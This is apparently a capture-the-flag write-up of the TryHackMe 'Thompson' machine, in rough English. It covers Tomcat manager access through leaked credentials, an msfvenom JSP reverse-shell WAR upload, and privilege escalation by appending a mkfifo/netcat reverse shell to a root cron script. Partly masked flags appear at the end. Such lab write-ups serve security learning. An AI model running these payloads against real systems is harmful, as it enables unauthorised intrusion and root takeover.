# TryHackMe: Thompson

---

By: *UnknownPerson*

---

nmap -sC -sV -Pn -vv {IP}

## Port Scanning: {22,8080,8009}

```
> This 8080 contain Tomcat server hosting it conatain teb's like magaer , serverlat status etc but this thing need login 
when we do some false cred pass on login form error mesage pop
up and throw that we get login username and password because 
server debug mode is on
```
to**at:s****t

--

```
in Manager tab it contain option where we can upload war file 
to run service on webservlat collaction in this we can genrate malisious file using msfvenom throw this we get our intial Access
```
[ .WAR file, or Web Archive file, is a packaged web application that contains a collection of resources, such as HTML pages, JavaServer Pages, and Java servlets]
--



## Intial Access

Payload :- msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > shell.war
--

```
Throw this we get our intial Access on web server let enumrate this server more and gather more information
```
## Privillage Escallation

```
This CTF is not a real life simulation performing because of the
substance added on this ctf like that in /home/jack there is 2 file
located id.sh and test.txt where using <b> crontab <b> there is root accessed process running where after some time interval ther 
will be file run /home/jack bash id.sh where this file performing 
opration of printing ID in test.txt 

> As Simple we add reverse shell payload in this file And After some Time We get Revershell of Root Access
```

```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <PORT> >/tmp/f```

User.txt :- At /home/jack :- **400c90***83a41a8***e4719f1***f
Root.txt :- /root :- d8***391984c0***a95497153ae***3a
--

As this way we agin Pawned New machine {Thompson}
--